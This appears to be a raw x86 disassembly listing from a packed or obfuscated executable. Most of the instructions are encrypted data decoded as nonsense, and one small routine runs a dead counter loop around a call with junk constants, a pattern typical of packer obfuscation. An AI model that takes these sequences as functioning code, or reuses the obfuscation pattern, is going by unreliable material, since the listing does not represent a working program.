  415a9a:	and    eax,0x5cf7ead9
  415a9f:	jecxz  0x415adb
  415aa1:	lock and BYTE PTR [esi],bl
  415aa4:	xlat   BYTE PTR ds:[ebx]
  415aa5:	push   cs
  415aa6:	out    dx,al
  415aa7:	mov    edx,0x61549795
  415aac:	int3   
  415aad:	jmp    FWORD PTR [eax+eiz*2]
  415ab0:	out    dx,al
  415ab1:	in     al,dx
  415ab2:	and    ebx,DWORD PTR [edi]
  415ab4:	idiv   BYTE PTR ds:0xedc2ddec
  415aba:	jns    0x415aba
  415abc:	ins    DWORD PTR es:[edi],dx
  415abd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415abe:	inc    edx
  415abf:	add    ah,BYTE PTR [ebp-0x64]
  415ac2:	fsub   DWORD PTR [edi-0x77ff3d8b]
  415ac8:	mov    eax,ds:0xbb9cb24e
  415acd:	leave  
  415ace:	inc    esi
  415acf:	in     al,0x7d
  415ad1:	jle    0x415ac6
  415ad3:	jo     0x415ac8
  415ad5:	scas   eax,DWORD PTR es:[edi]
  415ad6:	jg     0x415aae
  415ad8:	loop   0x415aaf
  415ada:	std    
  415adb:	arpl   WORD PTR [ebx+0x47ab2490],di
  415ae1:	adc    BYTE PTR [ebx+edi*8-0x466b6321],cl
  415ae8:	xor    cl,BYTE PTR [esi+0x1d83db7c]
  415aee:	or     al,0x7e
  415af0:	test   DWORD PTR [ecx+ebx*8],esp
  415af3:	nop
  415af4:	mov    ds:0xe38b9b9b,eax
  415af9:	or     al,0xe9
  415afb:	test   eax,0xf101304a
  415b00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415b01:	out    0xf7,eax
  415b03:	mov    ecx,0x3900100b
  415b08:	mov    ebx,0xae7f081d
  415b0d:	dec    esi
  415b0e:	mov    ?,WORD PTR [ebx+0x7f]
  415b11:	add    BYTE PTR [eax+esi*8-0x26f81a06],bh
  415b18:	jg     0x415b2f
  415b1a:	push   cs
  415b1b:	(bad)  
  415b1c:	mov    esi,0x12f2098
  415b21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415b22:	xchg   DWORD PTR [edi],edx
  415b24:	test   eax,0x95cdd4c9
  415b29:	popa   
  415b2a:	push   cs
  415b2b:	sub    BYTE PTR [esi-0x5c],0x18
  415b2f:	xchg   edi,eax
  415b30:	fs sbb eax,0x9214d932
  415b36:	mov    esp,0xc558b02
  415b3b:	xor    edx,esi
  415b3d:	mov    BYTE PTR [edx+eax*1+0x3272db],cl
  415b44:	mov    eax,DWORD PTR [ebp+0xc]
  415b47:	xor    eax,esi
  415b49:	add    eax,edi
  415b4b:	pop    edi
  415b4c:	pop    esi
  415b4d:	pop    ebx
  415b4e:	leave  
  415b4f:	ret    0x8
  415b52:	push   ebp
  415b53:	mov    ebp,esp
  415b55:	push   ecx
  415b56:	and    DWORD PTR ds:0x43101c,0x0
  415b60:	jmp    0x415b70
  415b65:	mov    eax,ds:0x43101c
  415b6a:	inc    eax
  415b6b:	mov    ds:0x43101c,eax
  415b70:	cmp    DWORD PTR ds:0x43101c,0x1b
  415b77:	jae    0x415bbd
  415b7d:	cmp    DWORD PTR ds:0x43101c,0x25
  415b84:	jne    0x415bb8
  415b8a:	push   0x5668
  415b8f:	push   DWORD PTR [ebp-0x24]
  415b92:	push   DWORD PTR [ebp-0x10]
  415b95:	push   DWORD PTR [ebp-0x20]
  415b98:	push   0x7cb6
  415b9d:	push   DWORD PTR [ebp-0x24]
  415ba0:	push   0x559a
  415ba5:	push   0x4b12
  415baa:	push   0x6519
  415baf:	push   DWORD PTR [ebp-0x28]
  415bb2:	call   DWORD PTR ds:0x42b030
  415bb8:	jmp    0x415b65
  415bbd:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  415bc4:	adc    DWORD PTR ds:0x432008,ecx
  415bca:	mov    eax,DWORD PTR [ebp+0x8]
  415bcd:	add    DWORD PTR ds:0x42f010,0x223f
  415bd7:	jmp    0x417f24
  415bdc:	into   
  415bdd:	or     al,0x6c
  415bdf:	jg     0x415c4d
  415be1:	fild   QWORD PTR [ebp-0x75]
  415be4:	dec    ebx
  415be5:	mov    ebp,0x90b018bc
  415bea:	fwait
  415beb:	cwde   
  415bec:	or     eax,0x52626147
  415bf1:	pop    edi
  415bf2:	bound  esp,QWORD PTR [edx-0x25]
  415bf5:	pusha  
  415bf6:	cld    
  415bf7:	adc    ebp,DWORD PTR [edi+0x45]
  415bfa:	push   cs
  415bfb:	(bad)  
  415bfd:	cmp    edx,DWORD PTR [ecx+0x25]
  415c00:	push   ebx
  415c01:	mov    eax,0xda563568
  415c06:	jecxz  0x415b92
  415c08:	and    al,0xa5
  415c0a:	push   es
  415c0b:	mul    DWORD PTR [eax-0x7c]
  415c0e:	jb     0x415c27
  415c10:	dec    edi
  415c11:	mov    al,0xb3
  415c13:	pop    edi
  415c14:	jnp    0x415c54
  415c16:	arpl   WORD PTR [ecx],di
  415c18:	xchg   edx,eax
  415c19:	(bad)  
  415c1a:	sar    DWORD PTR [esi],0xa2
  415c1d:	mov    BYTE PTR [eax+0x54],dl
  415c20:	mov    ebx,0xcf1d6bf2
  415c25:	mov    eax,ds:0xa1fb92c1
  415c2a:	out    0xf0,eax
  415c2c:	and    DWORD PTR [ebx-0x4a],0xd9aed8f6
  415c33:	jo     0x415bcd
  415c35:	or     dl,bh
  415c37:	repz jmp 0x415cb0
  415c3a:	push   ebp
  415c3b:	cmp    eax,0xa01a66b7
  415c40:	in     al,dx
  415c41:	sbb    BYTE PTR [esi],ch
  415c43:	(bad)  
  415c44:	mov    esi,0x3d353733
  415c49:	pusha  
  415c4a:	les    edx,FWORD PTR [esi-0x133a8686]
  415c50:	and    al,0x58
  415c52:	(bad)  
  415c53:	push   0xffffffbe
  415c55:	stos   BYTE PTR es:[edi],al
  415c56:	ins    DWORD PTR es:[edi],dx
  415c57:	in     eax,dx
  415c58:	mov    esi,DWORD PTR [ecx]
  415c5a:	xchg   esp,eax
  415c5b:	aad    0x51
  415c5d:	ja     0x415ca3
  415c5f:	ror    DWORD PTR [ebp+0x5],1
  415c62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c63:	sbb    DWORD PTR [edi-0x7c36b56],edx
  415c69:	dec    edx
  415c6a:	aam    0xda
  415c6c:	dec    esp
  415c6d:	pop    ds
  415c6e:	and    BYTE PTR [edi+0x3d],bl
  415c71:	repz mov cs,WORD PTR [edi+0x57]
  415c75:	test   DWORD PTR [edi+0x7e],0xec171a
  415c7c:	and    ebx,DWORD PTR [esi-0xb]
  415c7f:	loop   0x415c2e
  415c81:	pop    ds
  415c82:	cmp    ebx,ebx
  415c84:	out    0xf3,eax
  415c86:	shl    DWORD PTR [ecx+0x5da6821b],cl
  415c8c:	rcl    BYTE PTR [eax+0x2e],cl
  415c8f:	sbb    al,BYTE PTR [ebx]
  415c91:	jno    0x415c14
  415c93:	pop    edi
  415c94:	jp     0x415ca9
  415c96:	lds    ebx,FWORD PTR [edx]
  415c98:	or     ebx,DWORD PTR [esi+eiz*2+0x52]
  415c9c:	fistp  WORD PTR [esi+0x27914571]
  415ca2:	aam    0x64
  415ca4:	xchg   esp,eax
  415ca5:	jmp    0x415d1d
  415ca7:	pusha  
  415ca8:	push   esi
  415ca9:	fild   WORD PTR gs:[edi+0x64]
  415cad:	std    
  415cae:	mov    dh,0x43
  415cb0:	stos   DWORD PTR es:[edi],eax
  415cb1:	mov    es:0xd64cb8f7,eax
  415cb7:	sbb    DWORD PTR [esi+0x2e],esi
  415cba:	and    al,0xb3
  415cbc:	aaa    
  415cbd:	inc    DWORD PTR [ebp+0x2c214b58]
  415cc3:	xchg   edi,eax
  415cc4:	lods   al,BYTE PTR ds:[esi]
  415cc5:	fwait
  415cc6:	xchg   eax,edi
  415cc8:	adc    ecx,DWORD PTR [edi+ebp*2+0x62824e52]
  415ccf:	jle    0x415cff
  415cd1:	sbb    DWORD PTR [esi+0x6f],ebp
  415cd4:	mov    eax,ds:0x5507ed3d
  415cd9:	pop    edx
  415cda:	test   BYTE PTR [edx],dh
  415cdc:	sub    eax,0x4c48a445
  415ce1:	inc    edi
  415ce2:	inc    edi
  415ce3:	in     al,dx
  415ce4:	and    DWORD PTR [ebx],esi
  415ce6:	cli    
  415ce7:	mov    es,WORD PTR [edi]
  415ce9:	or     al,0xdb
  415ceb:	xor    eax,DWORD PTR [ebx+0x35]
  415cee:	(bad)  
  415cef:	xor    DWORD PTR ds:0xea8c46b9,esp
  415cf5:	ror    DWORD PTR [edi+ebp*1+0x36],0x81
  415cfa:	push   ecx
  415cfb:	cmp    edi,DWORD PTR [edx+0x4c]
  415cfe:	xchg   esp,eax
  415cff:	push   cs
  415d00:	xchg   WORD PTR [ecx+ebp*8],si
  415d04:	outs   dx,BYTE PTR ds:[esi]
  415d05:	ret    0x18ea
  415d08:	and    eax,0xe95bd6e2
  415d0d:	retf   0x45bb
  415d10:	dec    edx
  415d11:	xlat   BYTE PTR ds:[ebx]
  415d12:	adc    al,0x99
  415d14:	cmp    eax,ecx
  415d16:	(bad)  
  415d17:	fnsave [edi+esi*2]
  415d1a:	xchg   ebx,eax
  415d1b:	mov    dl,0x9c
  415d1d:	les    eax,FWORD PTR [ebp+0x39304d95]
  415d23:	out    dx,eax
  415d24:	loopne 0x415cd7
  415d26:	loopne 0x415d50
  415d28:	test   al,0x5
  415d2a:	xchg   DWORD PTR [eax+eax*2+0x3bef5eb5],ebp
  415d31:	dec    DWORD PTR [ebp-0x5e69d557]
  415d37:	std    
  415d38:	pop    esp
  415d39:	addr16 jbe 0x415d27
  415d3c:	jg     0x415dbb
  415d3e:	daa    
  415d3f:	mov    al,0x80
  415d41:	sbb    ah,BYTE PTR [edi-0x1e]
  415d44:	push   ebp
  415d45:	fadd   QWORD PTR [edi+0x35a970c7]
  415d4b:	or     DWORD PTR [edi+0x2dd4f9fe],0x43
  415d52:	mov    ds:0xd3677bc0,eax
  415d57:	into   
  415d58:	sbb    BYTE PTR [eax+0x40],ch
  415d5b:	fs or  eax,0x6c8c56cc
  415d61:	or     DWORD PTR [esi+0xdddf495],ebx
  415d67:	bound  edx,QWORD PTR [edi-0x29c59036]
  415d6d:	pop    ebp
  415d6e:	jnp    0x415d25
  415d70:	rcl    BYTE PTR [ebp-0x6671c15a],cl
  415d76:	inc    esi
  415d77:	jo     0x415db8
  415d79:	in     eax,0xd8
  415d7b:	fistp  QWORD PTR [ebx+eiz*4]
  415d7e:	inc    edx
  415d7f:	sub    BYTE PTR [ebx],0xf7
  415d82:	sub    BYTE PTR [esi+0x55],bh
  415d85:	mov    bh,0xae
  415d87:	pop    ss
  415d88:	mov    ebp,0xe10ff895
  415d8d:	and    al,0x14
  415d8f:	mov    ah,0x32
  415d91:	js     0x415de5
  415d93:	push   esp
  415d94:	sub    DWORD PTR [ebp-0x45],ecx
  415d97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d98:	mov    ds:0xc82dec8a,al
  415d9d:	cmp    al,0xb1
  415d9f:	int3   
  415da0:	jge    0x415e1c
  415da2:	sbb    BYTE PTR [ecx+0x13],bh
  415da5:	push   eax
  415da6:	jg     0x415d7c
  415da8:	and    al,0xf1
  415daa:	sbb    DWORD PTR [ecx],0x88eea221
  415db0:	mov    BYTE PTR [eax-0x7760f1f],0x15
  415db7:	rol    BYTE PTR [ecx],0xb9
  415dba:	inc    ebp
  415dbb:	int    0x53
  415dbd:	das    
  415dbe:	jge    0x415d4b
  415dc0:	ror    DWORD PTR [ebx+eiz*2-0x1d97511],0x37
  415dc8:	xchg   edi,eax
  415dc9:	cmp    esi,DWORD PTR [esi]
  415dcb:	pusha  
  415dcc:	(bad)  
  415dcd:	push   0x30
  415dcf:	mov    BYTE PTR [ebx+0x3],0xbc
  415dd3:	(bad)  
  415dd4:	push   esi
  415dd5:	push   ds
  415dd6:	cmp    al,0xaa
  415dd8:	add    al,0xa2
  415dda:	sbb    ebp,ebp
  415ddc:	leave  
  415ddd:	and    al,0x8f
  415ddf:	add    BYTE PTR es:[ecx-0x27],cl
  415de3:	add    al,0x22
  415de5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415de6:	push   esi
  415de7:	jmp    0xb3fbb88e
  415dec:	jno    0x415e27
  415dee:	not    ebp
  415df0:	sbb    BYTE PTR [esi+0x6a],bh
  415df3:	out    0x59,al
  415df5:	(bad)  
  415df7:	imul   eax,eax,0x2a634200
  415dfd:	add    ebp,DWORD PTR [ecx]
  415dff:	pusha  
  415e00:	mov    ah,0x9d
  415e02:	inc    esi
  415e03:	leave  
  415e04:	aas    
  415e05:	div    BYTE PTR [eax+ecx*4+0x62751eda]
  415e0c:	and    al,0x1a
  415e0e:	test   DWORD PTR [ecx+0x320761],edi
  415e14:	inc    esi
  415e15:	sub    DWORD PTR ds:0xde96cf04,edi
  415e1b:	aam    0x2e
  415e1d:	push   ecx
  415e1e:	pop    esi
  415e1f:	mov    ebx,0xdf4bf48c
  415e24:	mov    dl,0x15
  415e26:	pop    edi
  415e27:	mov    dl,0x8c
  415e29:	mov    dh,BYTE PTR [edx-0x29]
  415e2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e2d:	ret    0xc0a4
  415e30:	das    
  415e31:	aam    0xdf
  415e33:	mov    ebx,0x9e8141df
  415e38:	dec    edi
  415e39:	pop    edi
  415e3a:	fwait
  415e3b:	ss xchg edi,eax
  415e3d:	xchg   ecx,eax
  415e3e:	lds    edx,FWORD PTR [ecx+0x17]
  415e41:	bound  esp,QWORD PTR [edi*8-0x7168579a]
  415e48:	jmp    0xfa60b4cc
  415e4d:	sbb    DWORD PTR [eax+0x4d],0x38
  415e51:	inc    ebp
  415e52:	leave  
  415e53:	push   ds
  415e54:	ret    0xd60c
  415e57:	dec    ebx
  415e58:	ret    0xd64
  415e5b:	imul   edx,esp,0x42
  415e5e:	adc    BYTE PTR [esi-0x458541fe],0x33
  415e65:	mov    ebx,edx
  415e67:	inc    esp
  415e68:	test   al,0x7c
  415e6a:	sbb    ax,0xa849
  415e6e:	enter  0xe2d0,0x32
  415e72:	and    ebx,DWORD PTR [ecx]
  415e74:	imul   edx,DWORD PTR [ebp+0x258261b],0x27
  415e7b:	out    0x46,eax
  415e7d:	std    
  415e7e:	add    al,0xfb
  415e80:	push   esp
  415e81:	repnz fstp TBYTE PTR [eax+0x34]
  415e85:	sbb    BYTE PTR [edi+0x72],ah
  415e88:	dec    ebp
  415e89:	icebp  
  415e8a:	cmc    
  415e8b:	xchg   edi,eax
  415e8c:	add    dh,BYTE PTR [esi-0x53aa32b5]
  415e92:	shl    BYTE PTR [edi-0x29],0xe2
  415e96:	pushf  
  415e97:	dec    ebp
  415e98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e99:	fbld   TBYTE PTR [eax-0x6b86a5df]
  415e9f:	mov    DWORD PTR [esp+esi*8-0x565ccd74],edi
  415ea6:	mov    ah,0x3a
  415ea8:	or     dl,BYTE PTR [ecx+0x12]
  415eab:	stos   DWORD PTR es:[edi],eax
  415eac:	dec    edi
  415ead:	(bad)  
  415eaf:	lods   eax,DWORD PTR ds:[esi]
  415eb0:	stos   DWORD PTR es:[edi],eax
  415eb1:	sbb    DWORD PTR [esi],edi
  415eb3:	lea    ebx,[edi+edi*4]
  415eb6:	adc    al,0x42
  415eb8:	inc    edx
  415eb9:	mov    ah,0x6f
  415ebb:	add    dh,BYTE PTR [ebx*8+0xb34d4a2]
  415ec2:	jb     0x415ed8
  415ec4:	inc    edi
  415ec5:	test   DWORD PTR ds:0x7107a7d5,edx
  415ecb:	xchg   ecx,ebx
  415ecd:	cmp    BYTE PTR [ecx],al
  415ecf:	mov    DWORD PTR [edx+ebp*2+0x1882cd38],eax
  415ed6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ed7:	dec    esp
  415ed8:	and    DWORD PTR [esi-0x5c0eac4],ebx
  415ede:	sar    DWORD PTR [esi-0x72],cl
  415ee1:	mov    ecx,0x1549922e
  415ee6:	cmp    cl,BYTE PTR [edi-0x694515ae]
  415eec:	lods   al,BYTE PTR ds:[esi]
  415eed:	aam    0x69
  415eef:	jg     0x415ed1
  415ef1:	cli    
  415ef2:	outs   dx,BYTE PTR ds:[esi]
  415ef3:	or     ebp,esp
  415ef5:	or     al,0x1c
  415ef7:	xor    BYTE PTR [ebp+edx*1-0x4b84eebb],ch
  415efe:	adc    edx,DWORD PTR [ecx+0x72]
  415f01:	mov    WORD PTR [edi-0xd],fs
  415f04:	call   FWORD PTR [esi-0x492021a0]
  415f0a:	cmp    cl,ch
  415f0c:	xchg   ebx,eax
  415f0d:	sub    BYTE PTR [esi],0x4
  415f10:	add    bh,BYTE PTR [edi+0x1d]
  415f13:	xchg   edi,eax
  415f14:	sub    eax,0xecd0d6e9
  415f19:	add    eax,0xfce93fb2
  415f1e:	sahf   
  415f1f:	add    al,0xf
  415f21:	lods   al,BYTE PTR ds:[esi]
  415f22:	inc    edx
  415f23:	xor    esi,DWORD PTR [ecx+edx*1+0x33]
  415f27:	add    al,0xc1
  415f29:	add    ebx,DWORD PTR [ebx-0x72]
  415f2c:	xchg   BYTE PTR [ecx+eax*2],ch
  415f2f:	into   
  415f30:	cmp    al,0xa4
  415f32:	cmp    DWORD PTR [edx-0x6f],edi
  415f35:	dec    esi
  415f36:	adc    al,0x6e
  415f38:	xchg   esp,eax
  415f39:	mov    dh,0x97
  415f3b:	push   ss
  415f3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f3d:	test   BYTE PTR [ebp+0x232e7025],0x20
  415f44:	add    eax,0xc0093e48
  415f49:	or     DWORD PTR [edi],edx
  415f4b:	xor    esp,edi
  415f4d:	xlat   BYTE PTR ds:[ebx]
  415f4e:	xchg   ebp,eax
  415f4f:	jmp    0xcaaf:0x35357cc6
  415f56:	sub    al,0xe8
  415f58:	cs and al,0xcb
  415f5b:	push   ds
  415f5c:	sbb    BYTE PTR [ebx-0x74],bl
  415f5f:	adc    BYTE PTR [esi-0x49],0x89
  415f63:	sub    ecx,edx
  415f65:	retf   0xe57d
  415f68:	dec    eax
  415f69:	pusha  
  415f6a:	jmp    0x415f4b
  415f6c:	aas    
  415f6d:	mov    bh,0x18
  415f6f:	call   0x462e96b4
  415f74:	xor    dl,BYTE PTR [edx]
  415f76:	das    
  415f77:	adc    ebx,DWORD PTR [ecx-0x67]
  415f7a:	call   0xcbc3da8d
  415f7f:	imul   ebx,DWORD PTR [ebx-0x1b],0xffffffda
  415f83:	mov    al,BYTE PTR [ebp-0x4]
  415f86:	or     bh,bl
  415f88:	and    dl,BYTE PTR [ebp-0x59]
  415f8b:	lods   al,BYTE PTR ds:[esi]
  415f8c:	std    
  415f8d:	nop
  415f8e:	or     DWORD PTR [eax],0xffffff81
  415f91:	sub    al,0x99
  415f93:	shl    dl,cl
  415f95:	loope  0x415f36
  415f97:	xchg   ebp,eax
  415f98:	xor    eax,0xca3b0b41
  415f9d:	inc    ebx
  415f9e:	mov    ebp,DWORD PTR [ebx-0x5f9083f7]
  415fa4:	cs icebp 
  415fa6:	arpl   WORD PTR [esp+eiz*4-0x3e7b8ec6],di
  415fad:	fs inc esi
  415faf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415fb0:	call   0xbd39:0xb7afbed
  415fb7:	jmp    0xeeda53d
  415fbc:	add    dh,cl
  415fbe:	mov    ah,0x12
  415fc0:	xor    ecx,esp
  415fc2:	loopne 0x415f6b
  415fc4:	push   ds
  415fc5:	mov    ecx,DWORD PTR [esi+0x43]
  415fc8:	ror    DWORD PTR ds:0x399ce779,0xdf
  415fcf:	jmp    0x415f5c
  415fd1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415fd2:	xchg   BYTE PTR [edx-0x30],dh
  415fd5:	(bad)  
  415fd7:	or     bh,BYTE PTR [edi+eax*2-0x1f7dea79]
  415fde:	jnp    0x415fb1
  415fe0:	shl    BYTE PTR [ebx],0x82
  415fe3:	add    al,al
  415fe5:	shl    DWORD PTR [eax],1
  415fe7:	(bad)  
  415fe8:	iret   
  415fe9:	out    0xca,al
  415feb:	xor    cl,bl
  415fed:	mov    ch,0xb4
  415fef:	mov    al,ds:0x725bd65a
  415ff5:	xor    al,0xbf
  415ff7:	fisttp WORD PTR [edx]
  415ff9:	in     al,0xc2
  415ffb:	xchg   edx,eax
  415ffc:	out    0x8c,eax
  415ffe:	aaa    
  415fff:	sahf   
  416000:	xchg   edi,eax
  416001:	cmp    BYTE PTR [eax+0x9],0xcf
  416005:	not    dh
  416007:	(bad)  
  416008:	or     bh,BYTE PTR [esi+0x52]
  41600b:	fldenv [eax-0x428e7c27]
  416011:	add    dl,BYTE PTR [ecx-0x4ea15b88]
  416017:	sub    eax,0xb7ff839c
  41601c:	dec    esi
  41601d:	xchg   esp,eax
  41601e:	je     0x416097
  416020:	xor    al,0xc3
  416022:	dec    edx
  416023:	mov    edi,0x6cb53c70
  416028:	sbb    DWORD PTR [edx-0x1fa3c8d4],esp
  41602e:	loopne 0x41604d
  416030:	repnz push ebx
  416032:	and    dh,dh
  416034:	mov    dh,0xc0
  416036:	fdivr  DWORD PTR [ecx]
  416038:	push   ebx
  416039:	aaa    
  41603a:	ja     0x416009
  41603c:	ins    BYTE PTR es:[edi],dx
  41603d:	je     0x416000
  41603f:	xor    BYTE PTR [ebx],0x29
  416042:	sub    al,0x82
  416044:	(bad)  
  416045:	ja     0x416030
  416047:	data16 lahf 
  416049:	inc    ebx
  41604a:	ins    DWORD PTR es:[edi],dx
  41604b:	push   edi
  41604c:	add    al,0x6d
  41604e:	enter  0x25b0,0x13
  416052:	popa   
  416053:	popa   
  416054:	pop    esp
  416055:	(bad)  
  416056:	ins    BYTE PTR es:[edi],dx
  416057:	add    al,0x32
  416059:	lds    esi,FWORD PTR [edx+0x1ee52c81]
  41605f:	sub    al,0x6e
  416061:	enter  0x2e46,0x8a
  416065:	ror    BYTE PTR [ebp+0x57],1
  416068:	fwait
  416069:	cdq    
  41606a:	push   esp
  41606b:	or     ch,BYTE PTR gs:[edi-0x47]
  41606f:	clc    
  416070:	mov    ?,WORD PTR [esi-0x10]
  416073:	jne    0x416077
  416075:	or     DWORD PTR [eax+0x7c],ebp
  416078:	inc    ebx
  416079:	imul   ebp,DWORD PTR [ebx+edi*1+0x74],0xffffffbf
  41607e:	mov    edx,0x74fb74c1
  416083:	mov    cl,0x33
  416085:	ror    DWORD PTR [eax-0x27],1
  416088:	aam    0xfd
  41608a:	scas   eax,DWORD PTR es:[edi]
  41608b:	xor    DWORD PTR [edi-0x49db796e],edi
  416091:	adc    dl,BYTE PTR [esp+esi*2+0x7d]
  416095:	in     eax,dx
  416096:	scas   al,BYTE PTR es:[edi]
  416097:	xchg   ebx,edx
  416099:	push   cs
  41609a:	jns    0x4160f6
  41609c:	popf   
  41609d:	add    DWORD PTR [edi+eiz*2],eax
  4160a0:	mov    esp,0xb7f96063
  4160a5:	mov    ch,0xcf
  4160a7:	pop    esp
  4160a8:	(bad)  
  4160a9:	stc    
  4160aa:	bnd ret 
  4160ac:	add    BYTE PTR [edx-0x3a],al
  4160af:	repnz mov bh,0x85
  4160b2:	lock inc cl
  4160b5:	pushf  
  4160b6:	adc    BYTE PTR fs:[esi-0x31],dl
  4160ba:	cwde   
  4160bb:	nop
  4160bc:	and    eax,0x714edf39
  4160c1:	pop    ds
  4160c2:	rcl    DWORD PTR [esi-0x23],cl
  4160c5:	mov    ah,0xc0
  4160c7:	push   es
  4160c8:	mov    ebp,0xb328edb8
  4160cd:	cmp    DWORD PTR [eax],ebx
  4160cf:	mov    al,ds:0x1f3d5c47
  4160d4:	sub    eax,0xc76a749e
  4160d9:	jp     0x41612f
  4160db:	mov    ds:0x15c0f9ed,eax
  4160e0:	inc    ebx
  4160e1:	cmp    bl,BYTE PTR [edi+0x5]
  4160e4:	sbb    al,0xa2
  4160e6:	ror    BYTE PTR [ebp+0x4a],0xca
  4160ea:	jp     0x41607e
  4160ec:	fstp   DWORD PTR [esi]
  4160ee:	add    esp,DWORD PTR [eax+ebp*1]
  4160f1:	js     0x416097
  4160f3:	inc    esp
  4160f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4160f5:	mov    bl,0xfb
  4160f7:	leave  
  4160f8:	jle    0x41616f
  4160fa:	cmc    
  4160fb:	imul   edi,esp,0xffffffe5
  4160fe:	ret    
  4160ff:	or     eax,0x6f30016
  416104:	jo     0x4160ac
  416106:	sbb    ecx,DWORD PTR [edi-0x6fe01103]
  41610c:	pop    ss
  41610d:	(bad)  
  41610f:	and    BYTE PTR [ecx+0xf],dh
  416112:	mov    al,bl
  416114:	xor    DWORD PTR [ebp+0x616d5c96],ebx
  41611a:	out    0x97,eax
  41611c:	psubw  mm5,QWORD PTR [ecx+edx*2-0xb]
  416121:	je     0x41611d
  416123:	ret    
  416124:	mov    ebp,0x71ac6c
  416129:	popa   
  41612a:	adc    al,0xc0
  41612c:	aaa    
  41612d:	out    0xbf,eax
  41612f:	arpl   WORD PTR [esi+ebx*4-0x80],cx
  416133:	fdiv   DWORD PTR [ebp-0x79d2c232]
  416139:	daa    
  41613a:	sahf   
  41613b:	retf   
  41613c:	jecxz  0x4160cb
  41613e:	and    BYTE PTR [ebp+0x3b9da9fd],cl
  416144:	sub    al,0x6d
  416146:	(bad)  
  416147:	int    0x34
  416149:	add    cl,bl
  41614b:	lock inc ecx
  41614d:	data16 je 0x41612e
  416150:	nop
  416151:	jle    0x4160dc
  416153:	test   ch,ch
  416155:	(bad)  
  416156:	lahf   
  416157:	xchg   esp,eax
  416158:	mov    bl,0x81
  41615a:	mov    ch,0xb7
  41615c:	popa   
  41615d:	lock in eax,0xe6
  416160:	lds    esp,FWORD PTR [esi+eiz*4+0x32]
  416164:	leave  
  416165:	nop
  416166:	lea    esi,[eax]
  416168:	jge    0x4161ad
  41616a:	mov    ah,0x96
  41616c:	push   ds
  41616d:	sub    DWORD PTR [edx],edi
  41616f:	cmc    
  416170:	xor    dh,BYTE PTR [ebx-0x458aa58b]
  416176:	pop    edi
  416177:	mov    ah,0x9c
  416179:	lods   eax,DWORD PTR ds:[esi]
  41617a:	(bad)
  41617d:	or     DWORD PTR [ebp-0x29424ce4],ecx
  416183:	rol    BYTE PTR [ecx+0x7d],cl
  416186:	cmc    
  416187:	(bad)  
  416189:	inc    esi
  41618a:	enter  0xc955,0x81
  41618e:	ja     0x416160
  416190:	jmp    0x60f1:0xdc8083fa
  416197:	xor    eax,0x4c51c4fd
  41619c:	adc    eax,0xc3106272
  4161a1:	popa   
  4161a2:	push   0xbf65434a
  4161a7:	in     eax,dx
  4161a8:	aam    0x9a
  4161aa:	call   DWORD PTR [ecx]
  4161ac:	out    0x4b,eax
  4161ae:	retf   
  4161af:	jmp    0x483b:0x824f0310
  4161b6:	(bad)  
  4161b7:	test   BYTE PTR [esi+0x19],0x3
  4161bb:	sbb    eax,0xd76b0c46
  4161c0:	in     eax,dx
  4161c1:	mov    ebx,0xbb8282de
  4161c6:	mov    ch,0xae
  4161c8:	inc    edx
  4161c9:	in     al,dx
  4161ca:	xchg   ebx,eax
  4161cb:	cmp    eax,0x19cef252
  4161d0:	out    dx,eax
  4161d1:	dec    ebp
  4161d2:	xor    eax,0x1acf7964
  4161d7:	push   es
  4161d8:	xchg   ebx,eax
  4161d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4161da:	mov    cs,WORD PTR [edx]
  4161dc:	(bad)  [ebx-0x11]
  4161df:	inc    eax
  4161e0:	or     dl,ch
  4161e2:	add    DWORD PTR [eax+0x3b],0x87bc68e
  4161e9:	mov    al,ds:0x5947eb50
  4161ee:	jae    0x41624f
  4161f0:	xor    dh,bh
  4161f2:	adc    bh,BYTE PTR [edi+0x114ff2c8]
  4161f8:	inc    esp
  4161f9:	mov    ch,0x2e
  4161fb:	sub    DWORD PTR [ebx-0x4f],ebx
  4161fe:	mov    dh,0x50
  416200:	jnp    0x416193
  416202:	cmp    ah,BYTE PTR [eax+0x23]
  416205:	cmp    eax,0x282da600
  41620a:	pop    esp
  41620b:	cmp    al,0x14
  41620d:	bswap  ecx
  41620f:	pop    ss
  416210:	mov    edx,DWORD PTR [ebx]
  416212:	jmp    0x68fe281f
  416217:	retf   
  416218:	add    ebp,DWORD PTR [ebx+0x64]
  41621b:	test   al,0xa4
  41621d:	imul   edi,DWORD PTR [esi],0xf465f2d0
  416223:	sbb    eax,0x41a18cf5
  416228:	xchg   ebx,eax
  416229:	(bad)  
  41622a:	sbb    al,0x93
  41622c:	sahf   
  41622d:	add    eax,0x6111184c
  416232:	and    BYTE PTR [eax],bl
  416234:	adc    edx,ebp
  416236:	pop    edi
  416237:	shl    BYTE PTR [ebx+0x7e],cl
  41623a:	sbb    bh,al
  41623c:	js     0x416267
  41623e:	shl    DWORD PTR cs:[edi+0x93a34b4],1
  416245:	nop
  416246:	outs   dx,BYTE PTR ds:[esi]
  416247:	jns    0x41620b
  416249:	les    esp,FWORD PTR [esi-0x1be90c20]
  41624f:	cmp    al,0x82
  416251:	in     eax,0x34
  416253:	xchg   ebx,eax
  416254:	cmp    al,0xa3
  416256:	add    eax,0x214faaef
  41625b:	or     eax,0x25498b60
  416260:	mov    al,0x39
  416262:	test   al,0xa2
  416264:	cmc    
  416265:	mov    ebp,0x44fc5fff
  41626a:	scas   al,BYTE PTR es:[edi]
  41626b:	xor    DWORD PTR [edx],eax
  41626d:	or     al,0x7c
  41626f:	sbb    eax,0xaa61f62b
  416274:	scas   al,BYTE PTR es:[edi]
  416275:	sbb    eax,0x6533ac48
  41627a:	jl     0x4162bf
  41627c:	cdq    
  41627d:	(bad)  
